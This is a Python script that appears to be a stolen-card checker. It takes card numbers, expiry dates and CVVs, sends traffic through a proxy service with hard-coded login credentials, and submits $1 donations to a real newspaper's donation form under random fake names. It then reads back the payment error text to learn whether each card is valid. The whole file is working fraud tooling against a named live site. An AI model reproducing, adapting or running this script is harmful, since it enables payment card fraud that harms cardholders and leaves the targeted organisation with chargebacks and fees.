import requests,re
import random
import string
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		type = "Visa"
	if n.startswith("5"):
		type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	random1 = random.choice(string.ascii_letters)
	random2 = random.choice(string.ascii_letters)
	random3 = random.choice(string.ascii_letters)
	random4 = random.choice(string.ascii_letters)
	random5 = random.choice(string.ascii_letters)
	random6 = random.choice(string.ascii_letters)
	random7 = random.choice(string.ascii_letters)
	random8 = random.choice(string.ascii_letters)
	
	first = f'{random1}{random2}{random3}{random4}'
	last = f'{random5}{random6}{random7}{random8}'
	
	cookies = {
	    'PHPSESSID': '1d5d2630a85eaedd8e24c37da8',
	}
	
	headers = {
	    'authority': 'www.triangletribune.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'submenu': 'Donate',
	    'src': 'forms',
	    'ref': 'Donation',
	}
	
	response = session.get('https://www.triangletribune.com/index.php', params=params, cookies=cookies, headers=headers)
	
	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
	csrf = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    'PHPSESSID': '1d5d2630a85eaedd8e24c37da8',
	}
	
	headers = {
	    'authority': 'www.triangletribune.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.triangletribune.com',
	    'referer': 'https://www.triangletribune.com/index.php?submenu=Donate&src=forms&ref=Donation',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'formProcessed': 'Donation',
	}
	
	data = {
	    'formField_donation_amount': 'other',
	    'formField_other_amount': '1',
	    'formPayment_owner': f'{first} {last}',
	    'formPayment_card': f'{type}',
	    'formPayment_number': f'{n}',
	    'formPayment_cvv': f'{cvc}',
	    'formMeta_formPayment_expiration': 'expiration',
	    'formPayment_expiration[]': [
	        f'{mm}',
	        f'20{yy}',
	    ],
	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
	    'formPayment_method': 'Credit Card',
	    'formPayment_total_payment': '1',
	    'formPayment_gateway': '',
	    'hash': f'{hash}',
	    'csrfToken': f'{csrf}',
	    'edit_id': '0',
	    'module': '',
	    'src': 'forms',
	    'srctype': 'process',
	    'id': 'Donation',
	    'fs_id': 'Donation',
	    'submenu': 'Donate',
	}
	
	response = session.post('https://www.triangletribune.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'Payment error:</b> (.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'Palatino Linotype;">(.*?)<\/span>', response.text).group(1)
		
	return (result)
